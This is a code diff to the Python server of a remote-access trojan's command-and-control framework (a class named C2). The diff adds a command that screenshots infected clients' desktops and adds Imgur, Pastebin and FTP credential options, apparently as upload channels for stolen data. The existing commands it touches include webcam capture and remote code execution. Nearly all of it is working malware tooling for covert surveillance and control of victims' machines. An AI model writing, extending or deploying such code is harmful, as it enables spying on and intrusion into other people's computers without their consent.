@@ -8,6 +8,7 @@ import sys
 import time
 import json
 import Queue
+import string
 import pickle
 import socket
 import struct
@@ -21,18 +22,15 @@ import subprocess
 import collections
 import multiprocessing
 
+# packages
+# import cv2
+import colorama
+import SocketServer
+
 # modules
 import core.util as util
 import core.database as database
 import core.security as security
-
-# globals
-packages = ['cv2','colorama','SocketServer']
-platforms = ['win32','linux2','darwin']
-
-# setup
-util.is_compatible(platforms, __name__)
-util.imports(packages, globals())
 
 # globals
 __threads = {}
@@ -52,17 +50,10 @@ __banner__ = """
                d8'
 
 """
-try:
-    import colorama
-    colorama.init(autoreset=True)
-except ImportError:
-   util.log("installing required Python package 'colorama'...")
-   execfile('setup.py')
-   util.log("restarting...")
-   os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
 
 # main
 def main():
+
     parser = argparse.ArgumentParser(
         prog='server.py',
         version='0.1.5',
@@ -88,6 +79,24 @@ def main():
         type=str,
         default='database.db',
         help='SQLite database')
+
+    parser.add_argument(
+        '--imgur',
+        action='store',
+        type=str,
+        help='Imgur API key')
+
+    parser.add_argument(
+        '--pastebin',
+        action='store',
+        type=str,
+        help='Pastebin API key')
+
+    parser.add_argument(
+        '--ftp',
+        action='append',
+        nargs=3,
+        help='FTP hostname username password')
 
     modules = os.path.abspath('modules')
     packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']
@@ -155,10 +164,10 @@ class C2():
                 'method': self.quit,
                 'usage': 'exit',
                 'description': 'quit the server'},
-            'eval' : {
-                'method': self.eval,
-                'usage': 'eval <code>',
-                'description': 'execute python code directly on server (debugging MUST be enabled)'},
+            'debug' : {
+                'method': self.debug,
+                'usage': 'debug <code>',
+                'description': 'run python code directly on server (debugging MUST be enabled)'},
             'query' : {
                 'method': self.query,
                 'usage': 'query <statement>',
@@ -187,6 +196,10 @@ class C2():
                 'method': self.session_webcam,
                 'usage': 'webcam <mode>',
                 'description': 'capture image/video from the webcam of a client device'},
+            'screenshot': {
+                'method': self.session_screenshot,
+                'usage': 'screenshot',
+                'description': 'take a screenshot of the client desktop'},
             'kill' : {
                 'method': self.session_remove,
                 'usage': 'kill <id>',
@@ -286,7 +299,7 @@ class C2():
         with self._lock:
             return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())
 
-    def eval(self, code):
+    def debug(self, code):
         """ 
         Execute code directly in the context of the currently running process
 
@@ -543,6 +556,29 @@ class C2():
             result = task.get('result')
         util.display(result)
 
+    def session_screenshot(self):
+        """
+        Take a screenshot of the client desktop
+
+        """
+        if not self.current_session:
+            return "No client session"
+        else:
+            task = {"task": "screenshot", "session": self.current_session.info.get('uid')}
+            self.current_session.send_task(task)
+            output = self.current_session.recv_task()['result']
+            if not os.path.isdir('data'):
+                try:
+                    os.mkdir('data')
+                except OSError:
+                    util.log("Unable to create directory 'data' (permission denied)")
+                    return
+            filename = 'data/{}.png'.format(str().join([random.choice(string.lowercase + string.digits) for _ in range(3)]))
+            with file(filename, 'wb') as fp:
+                fp.write(output)
+            return filename
+
+
     def session_remove(self, session):
         """ 
         Shutdown client shell and remove client from database
@@ -672,7 +708,6 @@ class C2():
                 session.info = info
             self.sessions[self._count] = session
             self._count += 1
-
             prompt = self.current_session._prompt if self.current_session else self._prompt
             util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
             abort = globals()['__abort']
@@ -835,40 +870,40 @@ class Session(threading.Thread):
 
         """
         while True:
-            try:
-                if self._active.wait():
-                    task = self.recv_task() if not self._prompt else self._prompt
-                    if 'help' in task.get('task'):
-                        self._active.clear()
-                        globals()['c2'].help(task.get('result'))
-                        self._active.set()
-                    elif 'prompt' in task.get('task'):
-                        self._prompt = task
-                        command = globals()['c2']._get_prompt(task.get('result') % int(self.id))
-                        cmd, _, action  = command.partition(' ')
-                        if cmd in ('\n', ' ', ''):
-                            continue
-                        elif cmd in globals()['c2'].commands and cmd != 'help':
-                            result = globals()['c2'].commands[cmd]['method'](action) if len(action) else globals()['c2'].commands[cmd]['method']()
-                            if result:
-                                task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
-                                globals()['c2'].display(result.encode())
-                                globals()['c2'].database.handle_task(task)
-                            continue
-                        else:
-                            task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
-                            self.send_task(task)
-                    elif 'result' in task:
-                        if task.get('result') and task.get('result') != 'None':
-                            globals()['c2'].display(task.get('result').encode())
+#            try:
+            if self._active.wait():
+                task = self.recv_task() if not self._prompt else self._prompt
+                if 'help' in task.get('task'):
+                    self._active.clear()
+                    globals()['c2'].help(task.get('result'))
+                    self._active.set()
+                elif 'prompt' in task.get('task'):
+                    self._prompt = task
+                    command = globals()['c2']._get_prompt(task.get('result') % int(self.id))
+                    cmd, _, action  = command.partition(' ')
+                    if cmd in ('\n', ' ', ''):
+                        continue
+                    elif cmd in globals()['c2'].commands and cmd != 'help':
+                        result = globals()['c2'].commands[cmd]['method'](action) if len(action) else globals()['c2'].commands[cmd]['method']()
+                        if result:
+                            task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
+                            globals()['c2'].display(result.encode())
                             globals()['c2'].database.handle_task(task)
+                        continue
                     else:
-                        if self._abort:
-                            break
-                    self._prompt = None
-            except Exception as e:
-                util.log(str(e))
-                break
+                        task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
+                        self.send_task(task)
+                elif 'result' in task:
+                    if task.get('result') and task.get('result') != 'None':
+                        globals()['c2'].display(task.get('result').encode())
+                        globals()['c2'].database.handle_task(task)
+                else:
+                    if self._abort:
+                        break
+                self._prompt = None
+#            except Exception as e:
+#                util.log(str(e))
+#                break
         time.sleep(1)
         globals()['c2'].session_remove(self.id)
         self._active.clear()
